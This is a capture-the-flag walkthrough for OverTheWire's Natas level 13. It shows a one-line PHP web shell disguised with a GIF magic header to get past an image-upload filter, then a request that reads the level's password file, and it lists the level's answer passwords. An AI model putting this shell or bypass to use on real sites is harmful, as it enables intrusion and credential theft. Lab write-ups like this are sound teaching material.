# Natas Level 13 → Level 14
(Updated: 13 August 2025)

## Credentials
- **Username:** `natas13`
- **Password:** `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`

## Connection
Level url: [http://natas13.natas.labs.overthewire.org/](http://natas13.natas.labs.overthewire.org/)

## Steps to Solve
1. Step 1 - Just like the previous level we have to use the image uploading to access to shell and `cat` the password. However, this level has blocked `.php` file (or others that isn't image).
2. Step 2 - Create a `shell.php` with this content:
```php
GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```
- `GIF87`: is a magic header that maked the server thinks this is a `.gif` file (but it is a `.php`).
3. Step 3 - Use `DevTools` and change the exec type of the uploaded file to `.php`.
4. Step 4 - Upload the `shell.php` we created and access to [http://natas13.natas.labs.overthewire.org/upload/rn81hkpyec.php?e=cat%20/etc/natas_webpass/natas14](http://natas13.natas.labs.overthewire.org/upload/rn81hkpyec.php?e=cat%20/etc/natas_webpass/natas14) to get the password.
5. Step 5 - Take the password to the next level.

## Next Level Password
`z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`
